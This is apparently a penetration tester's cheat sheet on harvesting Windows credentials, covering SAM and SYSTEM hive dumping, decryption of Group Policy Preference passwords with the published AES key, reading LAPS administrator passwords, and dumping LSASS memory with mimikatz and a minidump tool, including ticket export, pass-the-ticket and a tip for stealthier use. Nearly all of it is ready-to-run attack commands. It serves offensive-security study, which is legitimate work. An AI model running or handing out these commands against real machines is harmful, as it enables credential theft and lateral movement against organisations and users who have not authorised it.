**DUMPING THE SAM:**

In order to dump the SAM, which stores the NTLM hashes for the local users on the machine we must first obtain a copy of the SAM and SYSTEM. Although the SAM is stored here "c:\Windows\System32\config\sam"
we cannot copy it directly, since it forms part of a running process. Additionally the SYSTEM has an exclusive lock.

1st method(create a shadow volume of the local hard drive with vssadmin): 

```
1. wmic shadowcopy call create Volume='C:\'
2. vssadmin list shadows
3. copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\trike\Downloads\sam
4. copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\trike\Downloads\system
```

2nd Method(extracting the SAM and the SYSTEM from registry hives):

```
1. reg save HKLM\sam C:\users\trike\Downloads\sam
2. reg save HKLM\system C:\users\trike\Downloads\system
```
To dump the contents of the SAM, my preferred method(although there are others) is using impacket-secretsdump:

```
~# impacket-secretsdump -sam sam -system system local
```

**GROUP POLICY PREFERENCES(GPP):**

The passwords are encrypted using AES-256, however microsoft published this AES-256 key. As a solution, the MS14-025 security update removed the ability to create GPP containing passwords. Altough the ability
to create new GPP was removed, the existing GPP weren't deleted, so some of them may still exist in the wild.
Manual dump:

```
1. Get a copy of the password in base64, the GPP are stored in this SMB share: \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\   additionally the GPP must be accessible to all domain users
2. echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
```

Automated dump with [Get-GPPPassword](https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py):

```
# with a NULL session
Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'

# with cleartext credentials
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# pass-the-hash
Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```

**LAPS(Local Administtrator Password Solution):**

LAPS offered a secure and scalable way of remotely managing the local administrator password for domain-joined computers.

Dumping it using a powershell script [LAPSToolKit](https://github.com/leoloobeek/LAPSToolkit):

```
PS C:\> Import-Module .\LAPSToolkit.ps1

PS C:\> Get-LAPSComputers  -> to list all computers that are set up with LAPS

PS C:\> Find-LAPSDelegatedGroups  -> list groups that can read LAPS

PS C:\> Get-LAPSComputers  -> if we are logged in as a user that can read LAPS, it will retrun us with a cleartext password for the "Administrator" account of a computer.
```
(All this information can be retrieved using SharpHound and viewed with BloodHound)

**LSASS(Local Security Authority Subsytem Service):**

Since Microsoft’s implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In current versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space.

However, since LSASS runs as SYSTEM, we need admin privileiges in order to access its memory space.

1st method(using mimikatz, the commands here are meant to be thrown froma mimikatz shell):

```
To dump credentials:
1. privilege::debug
2. sekurlsa::logonpasswords

To dump TGT and TGS:
1. sekurlsa::tickets
2. sekurlsa::tickets /export
3. kerberos::ptt ticket.kirbi
```
(If you want to be stealthier, you can use [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)).

2nd method(using [MiniDump.cs](https://github.com/trike33/PEN-300-Code-Snippets/blob/main/Windows%20Credentials/MiniDump.cs)):

Using this method we will create a dump file, which is a snapshot of a given process.

```
C:\minidump.exe c:\windows\tasks\lsass.dmp
```
(Then you can parse this dump file with mimikatz from a computer with matching OS and architecture, as the computer where the dump file was created)

```
#From a mimikatz shell(note that this doesn't require debug privileges)
1. sekurlsa::minidump lsass.dmp
2. sekurlsa::logonpasswords
